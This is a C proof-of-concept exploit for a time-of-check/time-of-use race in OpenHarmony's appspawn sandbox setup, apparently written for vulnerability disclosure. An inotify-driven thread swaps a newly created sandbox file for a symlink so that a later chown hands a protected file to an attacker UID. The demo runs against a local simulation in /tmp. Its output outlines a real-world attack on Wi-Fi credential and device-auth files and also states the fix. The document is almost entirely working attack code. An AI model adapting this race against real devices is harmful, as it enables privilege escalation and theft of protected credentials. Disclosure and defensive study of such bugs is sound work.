/*
 * PoC: appspawn CheckAndCreateSandboxFile() + CreateDemandSrc() TOCTOU
 *      → Arbitrary File Ownership Change (Privilege Escalation)
 *
 * Vulnerability: CWE-367 (TOCTOU Race Condition)
 * Component: OpenHarmony appspawn - modules/sandbox/modern/appspawn_sandbox.c
 *
 * Flow in DoSandboxPathNodeMount():
 *   1. CheckAndCreateSandboxFile(args.originPath) creates file
 *   2. CreateDemandSrc() calls chown(args.originPath, uid, gid)
 *
 * Between (1) and (2): file can be replaced with symlink → chown follows it.
 *
 * This PoC uses inotify to detect file creation and immediately replace it
 * with a symlink, reliably winning the race.
 *
 * Build: gcc -o poc poc.c -lpthread -O2
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/inotify.h>
#include <fcntl.h>
#include <errno.h>
#include <limits.h>

#define SANDBOX_BASE "/tmp/poc_sandbox"
#define TARGET_FILE "demand_file"
#define TARGET_PATH SANDBOX_BASE "/" TARGET_FILE
#define VICTIM_FILE "/tmp/poc_victim_sensitive_file"
#define FILE_MODE 0750
#define ATTACKER_UID 10000

static volatile int race_won = 0;
static volatile int stop_threads = 0;

/*
 * Attacker thread: uses inotify to detect file creation in SANDBOX_BASE,
 * then immediately replaces the file with a symlink to VICTIM_FILE.
 */
void *attacker_thread(void *arg)
{
    (void)arg;
    int ifd = inotify_init1(IN_NONBLOCK);
    if (ifd < 0) {
        perror("inotify_init");
        return NULL;
    }

    int wd = inotify_add_watch(ifd, SANDBOX_BASE, IN_CREATE | IN_CLOSE_WRITE);
    if (wd < 0) {
        perror("inotify_add_watch");
        close(ifd);
        return NULL;
    }

    char buf[4096] __attribute__((aligned(__alignof__(struct inotify_event))));

    while (!stop_threads) {
        ssize_t len = read(ifd, buf, sizeof(buf));
        if (len <= 0) {
            usleep(10);
            continue;
        }

        const struct inotify_event *event;
        for (char *ptr = buf; ptr < buf + len;
             ptr += sizeof(struct inotify_event) + event->len) {
            event = (const struct inotify_event *)ptr;

            if (event->len > 0 && strcmp(event->name, TARGET_FILE) == 0) {
                if (event->mask & (IN_CREATE | IN_CLOSE_WRITE)) {
                    /* File was just created/closed — replace with symlink */
                    unlink(TARGET_PATH);
                    symlink(VICTIM_FILE, TARGET_PATH);
                }
            }
        }
    }

    inotify_rm_watch(ifd, wd);
    close(ifd);
    return NULL;
}

/*
 * Simulates the appspawn sandbox setup flow.
 * In real code, CheckAndCreateSandboxFile and CreateDemandSrc are called
 * sequentially in DoSandboxPathNodeMount with some intermediate work.
 */
void *victim_thread(void *arg)
{
    (void)arg;

    for (int i = 0; i < 5000 && !stop_threads; i++) {
        /* Clean state */
        unlink(TARGET_PATH);

        /* === CheckAndCreateSandboxFile equivalent === */
        if (access(TARGET_PATH, F_OK) != 0) {
            int fd = open(TARGET_PATH, O_CREAT | O_WRONLY, FILE_MODE);
            if (fd >= 0) {
                close(fd);
            }
        }
        /* close(fd) happens here — inotify IN_CLOSE_WRITE fires */

        /* Small simulated delay: in real code there's function call overhead,
         * parameter validation, and sandboxNode->createDemand check */
        for (volatile int j = 0; j < 100; j++);

        /* === CreateDemandSrc → chown === */
        /* chown follows symlinks by default */
        chown(TARGET_PATH, ATTACKER_UID, ATTACKER_UID);

        /* Check if victim file ownership changed */
        struct stat st;
        if (lstat(VICTIM_FILE, &st) == 0 && st.st_uid == ATTACKER_UID) {
            printf("[!] RACE WON at iteration %d!\n", i);
            printf("[!] Victim file '%s' now owned by uid %d (was %d)\n",
                   VICTIM_FILE, ATTACKER_UID, (int)getuid());
            race_won = 1;
            stop_threads = 1;
            return NULL;
        }
    }
    return NULL;
}

int main(void)
{
    printf("=== appspawn Sandbox chown TOCTOU PoC (inotify-assisted) ===\n");
    printf("Target: OpenHarmony appspawn modules/sandbox/modern/appspawn_sandbox.c\n");
    printf("Bug: CheckAndCreateSandboxFile() creates file, CreateDemandSrc() chowns it\n");
    printf("     Symlink race between close(fd) and chown() → arbitrary file ownership\n");
    printf("Impact: Privilege escalation via arbitrary file ownership change\n\n");

    /* Setup sandbox directory */
    mkdir(SANDBOX_BASE, 0777);

    /* Create victim file owned by current user (simulates system file) */
    unlink(VICTIM_FILE);
    int fd = open(VICTIM_FILE, O_CREAT | O_WRONLY, 0600);
    if (fd < 0) {
        perror("create victim");
        return 1;
    }
    write(fd, "sensitive_system_data\n", 21);
    close(fd);

    struct stat st;
    stat(VICTIM_FILE, &st);
    printf("[*] Victim file '%s' owned by uid %d\n", VICTIM_FILE, st.st_uid);
    printf("[*] Attempting race (inotify monitors %s for file creation)...\n\n",
           SANDBOX_BASE);

    pthread_t attacker, victim;
    pthread_create(&attacker, NULL, attacker_thread, NULL);
    usleep(50000); /* Let inotify set up */
    pthread_create(&victim, NULL, victim_thread, NULL);

    pthread_join(victim, NULL);
    stop_threads = 1;
    pthread_join(attacker, NULL);

    if (race_won) {
        printf("\n[+] PoC SUCCESS: chown followed symlink to victim file\n");
        printf("[+] Real-world attack:\n");
        printf("[+]   1. Malicious app monitors sandbox demand paths via inotify\n");
        printf("[+]   2. When appspawn creates a demand file, attacker replaces\n");
        printf("[+]      it with symlink to /data/misc/wifi/wpa_supplicant.conf\n");
        printf("[+]      or /data/service/el1/public/deviceauth/*\n");
        printf("[+]   3. chown() changes ownership of the sensitive file\n");
        printf("[+]   4. Attacker can now read/write the previously protected file\n");
        printf("\n[+] Fix: Use lchown() instead of chown(), or open(O_NOFOLLOW)\n");
        printf("[+]       and fchown() on the resulting fd.\n");
    } else {
        printf("\n[-] Race not won in 5000 attempts\n");
        printf("[-] May need more attempts or CPU contention to widen window\n");
    }

    /* Cleanup */
    unlink(TARGET_PATH);
    unlink(VICTIM_FILE);
    rmdir(SANDBOX_BASE);
    return race_won ? 0 : 1;
}
